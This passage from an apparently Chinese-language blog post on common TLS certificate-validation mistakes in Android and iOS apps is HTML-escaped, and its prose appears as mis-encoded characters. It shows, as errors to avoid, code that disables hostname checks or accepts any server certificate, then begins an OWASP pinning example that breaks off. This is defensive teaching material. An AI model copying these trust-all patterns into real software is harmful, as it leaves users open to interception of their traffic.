&lt;span class=&quot;nc&quot;&gt;SSLContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SSLContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;TLS&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getTrustManagers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;no&quot;&gt;URL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://www.example.com/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;HttpsURLConnection&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urlConnection&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;HttpsURLConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;openConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;urlConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setSSLSocketFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getSocketFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;InputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urlConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;android-ÈåØË™§ËôïÁêÜÊÉÖÊ≥Å3&quot;&gt;Android ÈåØË™§ËôïÁêÜÊÉÖÊ≥Å3&lt;/h4&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;no&quot;&gt;URL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://www.example.com/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;HttpsURLConnection&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;HttpsURLConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;openConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setHostnameVerifier&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;SSLSocketFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;ALLOW_ALL_HOSTNAME_VERIFIER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;ÊàñÊòØ&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nc&quot;&gt;HostnameVerifier&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;allHostVerifier&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;HostnameVerifier&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;verify&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hostname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SSLSession&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;};&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;‰∏äËø∞ÂØ´Ê≥ïÁï•ÈÅé‰∫ÜÊÜëË≠â‰∏≠ÁöÑ hostname Ê™¢Êü•ÔºåÂ∞éËá¥Âç≥‰ΩøÈÄ£Á∑öÁ´ØËàáÊÜëË≠â‰∏≠ÊåáÂÆöÁöÑ hostname ‰∏ç‰∏ÄËá¥‰πüËÉΩÈÄöÈÅé„ÄÇËºÉÁÇ∫ÊÅ∞Áï∂ÁöÑÂÅöÊ≥ïÊòØ‰∏çÁâπÂà•Ë®≠ÂÆöÔºåËÆì‰ªñ‰ΩøÁî®È†êË®≠ÁöÑ DefaultHostnameVerifierÔºåÊàñÊòØÊé°Áî®Êõ¥ÁÇ∫Âö¥Ë¨πÁöÑ StrictHostnameVerifier„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;ios-ÈåØË™§ËôïÁêÜÊÉÖÊ≥Å1&quot;&gt;iOS ÈåØË™§ËôïÁêÜÊÉÖÊ≥Å1&lt;/h4&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-objc&quot; data-lang=&quot;objc&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;@implementation&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;NSURLRequest&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;IgnoreSSL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BOOL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;allowsAnyHTTPSCertificateForHost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;host&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;YES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;@end&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Ê≠§ÊÉÖÊ≥Å‰ΩøÁî®Âà∞ Framework ‰∏≠ÁöÑ Private APIÔºåÈõñÁÑ∂ÈÄôÁ®ÆÂØ´Ê≥ïÊúÉÂõ†ÁÇ∫‰∏çËÉΩÈÄöÈÅé Apple ÁöÑÂØ©Êü•ËÄå‰∏çÊúÉÂá∫ÁèæÂú® AppStore ‰∏ä(‰ΩøÁî®ÂõûÈÅøÊäÄÂ∑ß‰∏çÂú®ÈÄôË®éË´ñÁØÑÂúçÂÖß)Ôºå‰ΩÜ‰ªçÊúâÊ©üÊúÉÂú®ÁÑ°ÈúÄÁ∂ìÈÅé Apple ÂØ©Êü•ÁöÑ Enterprise App ‰∏≠‰ΩøÁî®„ÄÇËºÉÁÇ∫ÈÅ©Áï∂ÁöÑÂÅöÊ≥ïÊòØÁî® ‚Äú#if DEBUG‚ÄùÔºå‚Äù#endif‚Äù ÂåÖËµ∑‰æÜ‰ª•Á¢∫‰øùË©≤ÊÆµÁ®ãÂºèÂú®Á∑®Ë≠ØÊôÇÂè™ËÉΩÂ∞çÈñãÁôº‰∏≠ÁöÑ debug Áâà‰∏äÊúâ‰ΩúÁî®„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;ios-ÈåØË™§ËôïÁêÜÊÉÖÊ≥Å2&quot;&gt;iOS ÈåØË™§ËôïÁêÜÊÉÖÊ≥Å2&lt;/h4&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-objc&quot; data-lang=&quot;objc&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BOOL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLConnection&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;connection&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;canAuthenticateAgainstProtectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLProtectionSpace&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;protectionSpace&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;authenticationMethod&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;isEqualToString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLAuthenticationMethodServerTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLConnection&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;connection&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;didReceiveAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLAuthenticationChallenge&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;authenticationMethod&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;isEqualToString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLAuthenticationMethodServerTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;useCredential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLCredential&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;credentialForTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;forAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

    &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;continueWithoutCredentialForAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;‰∏äÈù¢ÁöÑÂÅöÊ≥ïÊúÉËÆì‰ΩøÁî® NSURLConnection ÁöÑÈÄ£Á∑öÁï•ÈÅéÊÜëË≠âÊ™¢Êü•ÔºåÂÆπË®±‰ªªÊÑèÊÜëË≠âÈÄöÈÅé„ÄÇ‰∏ãÈù¢ÁØÄÈåÑ OWASP WIKI ‰∏äÁöÑÁØÑ‰æãÔºö&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-objc&quot; data-lang=&quot;objc&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLConnection&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;connection&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;didReceiveAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                   &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLAuthenticationChallenge&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;challenge&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;([[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;authenticationMethod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;isEqualToString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NSURLAuthenticationMethodServerTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;SecTrustRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* failed */&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;OSStatus&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecTrustEvaluate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errSecSuccess&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* failed */&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;SecCertificateRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverCertificate&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecTrustGetCertificateAtIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverCertificate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* failed */&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;CFDataRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverCertificateData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecCertificateCopyData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverCertificate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverCertificateData&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;autorelease&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverCertificateData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* failed */&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UInt8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CFDataGetBytePtr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverCertificateData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CFIndex&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CFDataGetLength&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverCertificateData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;NSData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cert1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSData&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;dataWithBytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSUInteger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

